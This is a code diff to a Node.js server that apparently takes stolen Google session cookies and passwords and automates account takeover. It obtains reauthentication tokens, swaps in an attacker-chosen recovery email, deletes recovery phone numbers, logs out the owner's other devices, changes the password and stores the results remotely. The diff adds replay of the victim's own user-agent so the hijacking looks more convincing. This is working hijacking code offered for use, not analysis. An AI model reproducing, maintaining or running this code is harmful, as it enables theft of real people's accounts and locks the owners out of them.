@@ -30,7 +30,7 @@ app.post('/', async function (req, res) {
     if(req.body) {
         try {
             let mData = req.body.data.split('★')
-            if(mData.length == 7) {
+            if(mData.length == 8) {
                 console.log('Received Data')
                 getOSIDtoken(res, mData)
             } else {
@@ -71,12 +71,12 @@ function serverError(connection, mData, wrong, type) {
 
 function getOSIDtoken(connection, mData) {
 
-    let sendCookies = mData[6]
+    let sendCookies = mData[7]
 
     axios.get('https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(sendCookies)
+        headers: getHeader(mData[6], sendCookies)
     }).then(response => {
         let wrong = true
         try {
@@ -91,7 +91,7 @@ function getOSIDtoken(connection, mData) {
                 axios.get('https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0], {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: getHeader(tempCookes)
+                    headers: getHeader(mData[6], tempCookes)
                 }).then(response => {
                     let wrong = true
                     try {
@@ -123,7 +123,7 @@ function getOSIDtoken(connection, mData) {
                             if (osid) {
                                 wrong = false
                                 sendCookies += osid
-                                mData[6] = sendCookies
+                                mData[7] = sendCookies
 
                                 getRAPTtoken(connection, mData)
                             }
@@ -147,7 +147,7 @@ function getRAPTtoken(connection, mData) {
     axios.get('https://myaccount.google.com/signinoptions/rescuephone', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(mData[6])
+        headers: getHeader(mData[6], mData[7])
     }).then(response => {
         let wrong = true
         try {
@@ -161,7 +161,7 @@ function getRAPTtoken(connection, mData) {
                 axios.get('https://accounts.google.com/ServiceLogin?'+split[0], {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: getHeader(mData[6])
+                    headers: getHeader(mData[6], mData[7])
                 }).then(response => {
                     let wrong = true
                     try {
@@ -169,7 +169,7 @@ function getRAPTtoken(connection, mData) {
                         if (location) {
                             if(location.includes('rapt=')) {
                                 let index = location.indexOf('rapt=')
-                                mData[7] = location.substring(index+5, location.length).split('&')[0]
+                                mData[8] = location.substring(index+5, location.length).split('&')[0]
                                 wrong = false
             
                                 languageChange(connection, mData)
@@ -181,13 +181,13 @@ function getRAPTtoken(connection, mData) {
                                 axios.get('https://accounts.google.com/InteractiveLogin?'+rart, {
                                     maxRedirects: 0,
                                     validateStatus: null,
-                                    headers: getHeader(mData[6])
+                                    headers: getHeader(mData[6], mData[7])
                                 }).then(response => {
                                     try {
                                         let location = response.headers['location']
                                         if(location.includes('rapt=')) {
                                             let index = location.indexOf('rapt=')
-                                            mData[7] = location.substring(index+5, location.length).split('&')[0]
+                                            mData[8] = location.substring(index+5, location.length).split('&')[0]
                                             
                                             languageChange(connection, mData)
                                         } else {
@@ -247,11 +247,11 @@ function passwordMatching(connection, mData) {
             'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
             'google-accounts-xsrf': '1',
             'origin': 'https://accounts.google.com',
-            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+            'sec-ch-ua': '"Chromium";v="113", "Google Chrome";v="113", "Not:A-Brand";v="99"',
             'sec-ch-ua-arch': '"x86"',
             'sec-ch-ua-bitness': '"64"',
-            'sec-ch-ua-full-version': '"112.0.5615.49"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
+            'sec-ch-ua-full-version': '"113.0.5672.64"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="113.0.5672.64", "Google Chrome";v="113.0.5672.64", "Not:A-Brand";v="99.0.0.0"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -260,8 +260,8 @@ function passwordMatching(connection, mData) {
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'cookie': '__Host-GAPS='+mData[5]+'; '+mData[6],
-            'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+            'cookie': '__Host-GAPS='+mData[5]+'; '+mData[7],
+            'user-agent': mData[6],
             'x-same-domain': '1',
         }
     }).then(response => {
@@ -275,7 +275,7 @@ function passwordMatching(connection, mData) {
                 let url = decodeURIComponent(data[0][13][2])
                 if(url.includes('rapt=')) {
                     let index = url.indexOf('rapt=')
-                    mData[7] = url.substring(index+5, url.length).split('&')[0]
+                    mData[8] = url.substring(index+5, url.length).split('&')[0]
                     wrong = false
                     languageChange(connection, mData)
                 }
@@ -292,7 +292,7 @@ function languageChange(connection, mData) {
     axios.get('https://myaccount.google.com/phone', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(mData[6])
+        headers: getHeader(mData[6], mData[7])
     }).then(response => {
         try {
             const dom = new JSDOM(response.data)
@@ -361,16 +361,16 @@ function languageChange(connection, mData) {
             let position = Math.floor((Math.random() * (mRecovery.length-1)))
             let recovery = mRecovery[position]
             
-            mData[8] = mGmail
-            mData[9] = recovery
-            mData[10] = numbers
-            mData[11] = time
-            mData[12] = year
+            mData[9] = mGmail
+            mData[10] = recovery
+            mData[11] = numbers
+            mData[12] = time
+            mData[13] = year
 
             axios.post('https://myaccount.google.com/_/language_update', getLanguage(time), {
                 maxRedirects: 0,
                 validateStatus: null,
-                headers: getHeader(mData[6])
+                headers: getHeader(mData[6], mData[7])
             }).then(response => {
                 recoveryChange(connection, mData)
             }).catch(err => {
@@ -385,24 +385,24 @@ function languageChange(connection, mData) {
 }
 
 function recoveryChange(connection, mData) {
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[7], getRecoveryData(mData[9]+'@gmail.com', mData[11]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[8], getRecoveryData(mData[10]+'@gmail.com', mData[12]), {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(mData[6])
+        headers: getHeader(mData[6], mData[7])
     }).then(response => {
         let wrong = true
         try {
             if(!response.data.includes('"er"')) {
                 wrong = false
-                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=B10HMd', getSafeBrowserData(mData[11]), {
+                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=B10HMd', getSafeBrowserData(mData[12]), {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: getHeader(mData[6])
+                    headers: getHeader(mData[6], mData[7])
                 }).then(response => {
-                    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[11]), {
+                    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[8], getVerificationData(mData[12]), {
                         maxRedirects: 0,
                         validateStatus: null,
-                        headers: getHeader(mData[6])
+                        headers: getHeader(mData[6], mData[7])
                     }).then(response => {
                         deviceLogOut(connection, mData)
                     }).catch(err => {
@@ -425,7 +425,7 @@ function deviceLogOut(connection, mData) {
     axios.get('https://myaccount.google.com/device-activity', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(mData[6])
+        headers: getHeader(mData[6], mData[7])
     }).then(response => {
         try {
             const dom = new JSDOM(response.data)
@@ -462,9 +462,9 @@ function deviceLogOut(connection, mData) {
             }
 
             if (time == null) {
-                time = mData[11]
+                time = mData[12]
             } else {
-                mData[11] = time
+                mData[12] = time
             }
 
             if(Object.keys(logout).length > 0) {
@@ -476,12 +476,12 @@ function deviceLogOut(connection, mData) {
                     axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOut(value, time), {
                         maxRedirects: 0,
                         validateStatus: null,
-                        headers: getHeader(mData[6])
+                        headers: getHeader(mData[6], mData[7])
                     }).then(response => {
                         axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=Z5lnef&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOutAgain(time), {
                             maxRedirects: 0,
                             validateStatus: null,
-                            headers: getHeader(mData[6])
+                            headers: getHeader(mData[6], mData[7])
                         }).then(response => {
                             output++
                             if(output == size) {
@@ -514,17 +514,17 @@ function deviceLogOut(connection, mData) {
 function numberRemove(connection, mData) {
     let size = 0
     let output = 0
-    let numbers = mData[10]
+    let numbers = mData[11]
 
     if (numbers.length == 0) {
         passwordChange(connection, mData)
     } else {
         for(let i=0; i<numbers.length; i++) {
             size++
-            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[7], getPhoneData(numbers[i], mData[11]), {
+            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[8], getPhoneData(numbers[i], mData[12]), {
                 maxRedirects: 0,
                 validateStatus: null,
-                headers: getHeader(mData[6])
+                headers: getHeader(mData[6], mData[7])
             }).then(response => {
                 output++
                 if(output == size) {
@@ -544,30 +544,30 @@ function numberRemove(connection, mData) {
 function passwordChange(connection, mData) {
     let changePass = getRandomPassword()
 
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[7], getChangePasswordData(changePass, mData[11]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[8], getChangePasswordData(changePass, mData[12]), {
         maxRedirects: 0,
         validateStatus: null,
-        headers: getHeader(mData[6])
+        headers: getHeader(mData[6], mData[7])
     }).then(response => {
         try {
             if(response.data.includes('"er"')) {
                 changePass = mData[2]
             }
 
-            let send = { create: mData[12], password: changePass, recovery: mData[9] }
+            let send = { create: mData[13], password: changePass, recovery: mData[10] }
             
-            axios.put(COMPLETED+mData[0]+'/'+mData[8]+'.json', JSON.stringify(send), {
+            axios.put(COMPLETED+mData[0]+'/'+mData[9]+'.json', JSON.stringify(send), {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
             }).then(res => {
-                send['gmail'] = mData[8]
+                send['gmail'] = mData[9]
                 console.log(send)
                 if (connection) {
                     connection.end(JSON.stringify(send))
                 }
             }).catch(err => {
-                send['gmail'] = mData[8]
+                send['gmail'] = mData[9]
                 console.log(send)
                 if (connection) {
                     connection.end(JSON.stringify(send))
@@ -579,20 +579,20 @@ function passwordChange(connection, mData) {
         try {
             changePass = mData[2]
 
-            let send = { create: mData[12], password: changePass, recovery: mData[9] }
+            let send = { create: mData[13], password: changePass, recovery: mData[10] }
             
-            axios.put(COMPLETED+mData[0]+'/'+mData[8]+'.json', JSON.stringify(send), {
+            axios.put(COMPLETED+mData[0]+'/'+mData[9]+'.json', JSON.stringify(send), {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
             }).then(res => {
-                send['gmail'] = mData[8]
+                send['gmail'] = mData[9]
                 console.log(send)
                 if (connection) {
                     connection.end(JSON.stringify(send))
                 }
             }).catch(err => {
-                send['gmail'] = mData[8]
+                send['gmail'] = mData[9]
                 console.log(send)
                 if (connection) {
                     connection.end(JSON.stringify(send))
@@ -692,7 +692,7 @@ function getRandomPassword() {
     return pass
 }
 
-function getHeader(cookie) {
+function getHeader(userAgent, cookie) {
     return {
         'authority': 'myaccount.google.com',
         'accept': '*/*',
@@ -700,11 +700,11 @@ function getHeader(cookie) {
         'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
         'cookie': cookie,
         'origin': 'https://myaccount.google.com',
-        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        'sec-ch-ua': '"Chromium";v="113", "Google Chrome";v="113", "Not:A-Brand";v="99"',
         'sec-ch-ua-arch': '"x86"',
         'sec-ch-ua-bitness': '"64"',
-        'sec-ch-ua-full-version': '"112.0.5615.49"',
-        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
+        'sec-ch-ua-full-version': '"113.0.5672.64"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="113.0.5672.64", "Google Chrome";v="113.0.5672.64", "Not:A-Brand";v="99.0.0.0"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-model': '""',
         'sec-ch-ua-platform': '"Windows"',
@@ -713,7 +713,7 @@ function getHeader(cookie) {
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+        'user-agent': userAgent,
         'x-same-domain': '1',
     }
 }
